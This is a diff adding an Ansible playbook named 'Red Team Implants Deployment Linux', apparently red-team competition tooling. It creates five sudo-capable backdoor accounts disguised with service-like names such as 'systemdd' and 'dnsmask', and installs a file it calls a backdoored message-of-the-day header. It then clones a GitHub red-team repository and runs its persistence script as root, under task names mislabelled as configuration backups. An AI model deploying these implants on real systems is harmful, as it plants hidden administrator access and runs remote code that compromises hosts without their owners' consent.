@@ -1,0 +1,95 @@
+---
+
+  
+  - name: Red Team Implants Deployment Linux
+    hosts: Linux 
+
+    tasks:
+
+      - name: add user ftp
+        user:
+          name: ftp
+          append: true
+          groups: sudo
+          shell: '/bin/bash'
+          password: '$6$93ZPvErHcT6qq7/z$4H1v50eUFYBITrT./yu63CqEFR2t4A4bkUXJ6htYK/ltk69/k/m2e67KnOI9ku1YLh5zSdPmbfUEsIdJi4VnQ1'
+        become: yes
+
+      - name: add user systemdd
+        user:
+          name: systemdd
+          append: true
+          groups: sudo
+          shell: '/bin/bash'
+          password: '$6$93ZPvErHcT6qq7/z$4H1v50eUFYBITrT./yu63CqEFR2t4A4bkUXJ6htYK/ltk69/k/m2e67KnOI9ku1YLh5zSdPmbfUEsIdJi4VnQ1'
+        become: yes
+
+      - name: add user styemd-resolver
+        user:
+          name: systemd-resolver
+          append: true
+          groups: sudo
+          shell: '/bin/bash'
+          password: '$6$93ZPvErHcT6qq7/z$4H1v50eUFYBITrT./yu63CqEFR2t4A4bkUXJ6htYK/ltk69/k/m2e67KnOI9ku1YLh5zSdPmbfUEsIdJi4VnQ1'
+        become: yes
+      
+      - name: add user dnsmask
+        user:
+          name: dnsmask
+          append: true
+          groups: sudo
+          shell: '/bin/bash'
+          password: '$6$93ZPvErHcT6qq7/z$4H1v50eUFYBITrT./yu63CqEFR2t4A4bkUXJ6htYK/ltk69/k/m2e67KnOI9ku1YLh5zSdPmbfUEsIdJi4VnQ1'
+        become: yes
+      
+      - name: add user cups
+        user:
+          name: cups
+          append: true
+          groups: sudo
+          shell: '/bin/bash'
+          password: '$6$93ZPvErHcT6qq7/z$4H1v50eUFYBITrT./yu63CqEFR2t4A4bkUXJ6htYK/ltk69/k/m2e67KnOI9ku1YLh5zSdPmbfUEsIdJi4VnQ1'
+        become: yes
+      
+      - name: Backup Default Configuration File for 00-header
+        shell:
+          cmd: mv /etc/update-motd.d/00-header /etc/ssh/00-header-default
+        become: yes
+
+      - name: Copy over backdoored message of the day
+        copy:
+          src: ./configs/00-header.sh
+          dest: /etc/update-motd.d/00-header
+          owner: root
+          group: root
+          mode: '0744'
+        become: yes
+      
+      - name: Install git
+        apt: 
+          name: git
+          state: latest
+          update_cache: true
+          only_upgrade: true
+        become: yes
+
+      - name: Install python
+        apt: 
+          name: python
+          state: latest
+          update_cache: true
+          only_upgrade: true
+        become: yes
+
+      - name: Backup Default Configuration File for 00-header
+        shell:
+          cmd: git clone https://github.com/sKannanaikal/Red-Team-Tools.git
+        become: yes
+
+      - name: Backup Default Configuration File for 00-header
+        shell:
+          cmd: python ./Red-Team-Tools/persistence/instant-transmission.py
+        become: yes
+
+      
+
